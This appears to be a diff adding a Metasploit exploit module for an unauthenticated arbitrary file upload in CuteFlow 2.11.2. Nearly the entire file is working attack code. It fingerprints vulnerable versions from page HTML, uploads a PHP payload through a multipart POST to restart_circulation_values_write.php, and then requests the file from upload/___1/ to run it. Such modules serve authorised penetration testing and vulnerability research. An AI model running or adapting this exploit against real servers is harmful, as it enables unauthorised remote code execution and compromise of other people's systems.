@@ -1,0 +1,125 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info={})
+		super(update_info(info,
+			'Name'           => "CuteFlow v2.11.2 Arbitrary File Upload Vulnerability",
+			'Description'    => %q{
+				This module exploits a vulnerability in CuteFlow version 2.11.2 or prior.
+				This application has an upload feature that allows an unauthenticated
+				user to upload arbitrary files to the 'upload/___1/' directory
+				and then execute it.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         =>
+				[
+					'Brendan Coles <bcoles[at]gmail.com>' # Discovery and exploit
+				],
+			'References'     =>
+				[
+					['URL', 'http://itsecuritysolutions.org/2012-07-01-CuteFlow-2.11.2-multiple-security-vulnerabilities/'],
+					['OSVDB', '84829'],
+					#['EDB',   ''],
+				],
+			'Payload'        =>
+				{
+					'BadChars' => "\x00"
+				},
+			'DefaultOptions'  =>
+				{
+					'ExitFunction' => "none"
+				},
+			'Platform'       => 'php',
+			'Arch'           => ARCH_PHP,
+			'Targets'        =>
+				[
+					['Automatic Targeting', { 'auto' => true }]
+				],
+			'Privileged'     => false,
+			'DisclosureDate' => "Jul 27 2012",
+			'DefaultTarget'  => 0))
+
+		register_options(
+			[
+				OptString.new('TARGETURI', [true, 'The path to the web application', '/cuteflow_v.2.11.2/'])
+			], self.class)
+	end
+
+	def check
+
+		base  = target_uri.path
+		base << '/' if base[-1, 1] != '/'
+		res = send_request_raw({
+			'method' => 'GET',
+			'uri'    => "#{base}"
+		})
+
+		if res.body =~ /\<strong style\=\"font\-size\:8pt\;font\-weight\:normal\"\>Version 2\.11\.2\<\/strong\>\<br\>/
+			return Exploit::CheckCode::Vulnerable
+		elsif res.body =~ /\<a href\=\"http\:\/\/cuteflow\.org" target\=\"\_blank\"\>/
+			return Exploit::CheckCode::Detected
+		else
+			return Exploit::CheckCode::Safe
+		end
+
+	end
+
+	def upload(base, fname, file)
+
+		# construct post data
+		boundary = "----WebKitFormBoundary#{rand_text_alphanumeric(10)}"
+		data_post  = "--#{boundary}\r\n"
+		data_post << "Content-Disposition: form-data; name=\"attachment1\"; filename=\"#{fname}\"\r\n"
+		data_post << "Content-Type: text/php\r\n"
+		data_post << "\r\n"
+		data_post << file
+		data_post << "\r\n"
+		data_post << "--#{boundary}\r\n"
+
+		# upload
+		res = send_request_cgi({
+			'method'  => 'POST',
+			'uri'     => "#{base}pages/restart_circulation_values_write.php",
+			'ctype'   => "multipart/form-data; boundary=#{boundary}",
+			'data'    => data_post,
+		})
+
+		return res
+	end
+
+	def exploit
+		base  = target_uri.path
+		base << '/' if base[-1, 1] != '/'
+		@peer = "#{rhost}:#{rport}"
+
+		# upload PHP payload to upload/___1/
+		print_status("#{@peer} - Uploading PHP payload (#{payload.encoded.length.to_s} bytes)")
+		fname = rand_text_alphanumeric(rand(10)+6) + '.php'
+		php   = %Q|<?php #{payload.encoded} ?>|
+		res   = upload(base, fname, php)
+		if res.nil?
+			print_error("#{@peer} - Uploading PHP payload failed")
+			return
+		end
+
+		# retrieve and execute PHP payload
+		print_status("#{@peer} - Retrieving file: #{fname}")
+		send_request_raw({
+			'method' => 'GET',
+			'uri'    => "#{base}upload/___1/#{fname}"
+		})
+
+		handler
+	end
+end
